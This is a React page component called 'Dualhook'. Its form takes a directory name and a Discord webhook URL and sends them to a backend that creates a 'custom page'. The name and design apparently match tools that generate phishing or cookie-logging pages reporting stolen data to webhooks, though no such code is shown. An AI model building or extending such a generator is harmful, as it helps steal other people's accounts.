import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { z } from "zod";
import { useEffect, useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/hooks/use-api";

type DualhookForm = z.infer<typeof dualhookSchema>;

const dualhookSchema = z.object({
  directoryName: z.string().min(1, "Directory name is required"),
  webhook: z.string().url("Must be a valid URL").regex(/^https:\/\/(discord\.com|discordapp\.com)\/api\/webhooks\//, 
    "Must be a valid Discord webhook URL"),
});

function StarField() {
  useEffect(() => {
    const createStars = (layer: number) => {
      const container = document.querySelector(`.star-layer-${layer}`);
      if (!container) return;

      const count = 50; // number of stars per layer
      for (let i = 0; i < count; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.left = `${Math.random() * 100}%`;
        star.style.top = `${Math.random() * 100}%`;
        star.style.animationDelay = `${Math.random() * 20}s`;
        container.appendChild(star);
      }
    };

    // Create stars for each layer
    for (let layer = 1; layer <= 5; layer++) {
      createStars(layer);
    }

    // Cleanup function
    return () => {
      for (let layer = 1; layer <= 5; layer++) {
        const container = document.querySelector(`.star-layer-${layer}`);
        if (container) {
          container.innerHTML = '';
        }
      }
    };
  }, []);

  return (
    <div className="starfield">
      <div className="star-layer-1" />
      <div className="star-layer-2" />
      <div className="star-layer-3" />
      <div className="star-layer-4" />
      <div className="star-layer-5" />
    </div>
  );
}

export default function Dualhook() {
  const { toast } = useToast();
  const [cooldown, setCooldown] = useState(0);
  const [isCounting, setIsCounting] = useState(false);

  useEffect(() => {
    let timer: number | null = null;

    if (isCounting && cooldown > 0) {
      timer = window.setTimeout(() => {
        setCooldown(prev => prev - 1);
      }, 1000);
    } else if (cooldown === 0) {
      setIsCounting(false);
    }

    return () => {
      if (timer) clearTimeout(timer);
    };
  }, [isCounting, cooldown]);

  const form = useForm<DualhookForm>({
    resolver: zodResolver(dualhookSchema),
    defaultValues: {
      directoryName: "",
      webhook: "",
    },
  });

  const mutation = useMutation({
    mutationFn: async (data: DualhookForm) => {
      return apiRequest("POST", "/api/dualhook", data);
    },
    onSuccess: (data) => {
      toast({
        title: "Success!",
        description: `Your custom page has been created at ${data.url}`,
      });

      form.reset();
      setCooldown(25);
      setIsCounting(true);
    },
    onError: (error: Error) => {
      toast({
        title: "Error",
        description: error.message || "This directory name is already taken. Please choose a different name.",
        variant: "destructive",
      });

      // Focus the directory field to prompt the user to change it
      if (error.message?.includes("directory name is already taken")) {
        setTimeout(() => {
          form.setFocus("directoryName");
        }, 100);
      }
      if (error.message?.includes("rate limited")) {
          const match = error.message.match(/(\d+) seconds/);
          if (match && match[1]) {
            const seconds = parseInt(match[1], 10);
            setCooldown(seconds);
            setIsCounting(true);
          } else {
            setCooldown(25);
            setIsCounting(true);
          }
      }
    },
  });

  const onSubmit = (data: DualhookForm) => {
    mutation.mutate(data);
  };

  return (
    <>
      <StarField />
      <div className="relative min-h-screen p-4 sm:p-8">
        {/* Navigation Buttons */}
        <div className="fixed top-4 left-4 right-4 flex justify-between z-10">
          <Button
            variant="outline"
            className="font-semibold"
            onClick={() => window.location.href = "/"}
          >
            Home
          </Button>
          <Button
            variant="outline"
            className="font-semibold"
            onClick={() => window.open("https://discord.gg/UWFNZvBCFf", "_blank")}
          >
            Help
          </Button>
        </div>

        <div className="relative max-w-2xl mx-auto">
          <div className="mb-8 text-center">
            <h1 className="text-4xl font-bold bg-gradient-to-r from-white to-white/60 bg-clip-text text-transparent">
              Dualhook
            </h1>
            <p className="text-white/70">
              Enter your directory name and webhook
            </p>
          </div>

          <div className="bg-black/30 backdrop-blur-sm p-6 rounded-lg border border-white/10">
            <Form {...form}>
              <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <FormField
                  control={form.control}
                  name="directoryName"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white/90">Directory Name</FormLabel>
                      <FormControl>
                        <Input 
                          placeholder="Enter directory name..."
                          className="bg-black/50 border-white/20 text-white placeholder:text-white/50"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-red-400" />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="webhook"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-white/90">Webhook</FormLabel>
                      <FormControl>
                        <Input 
                          placeholder="https://discord.com/api/webhooks/..."
                          className="bg-black/50 border-white/20 text-white placeholder:text-white/50"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-red-400" />
                    </FormItem>
                  )}
                />

                <Button 
                  type="submit" 
                  className="w-full bg-white/10 hover:bg-white/20 text-white"
                  disabled={cooldown > 0}
                >
                  {cooldown > 0 ? `Submit (${cooldown}s)` : "Submit"}
                </Button>
              </form>
            </Form>
          </div>
        </div>
      </div>
    </>
  );
}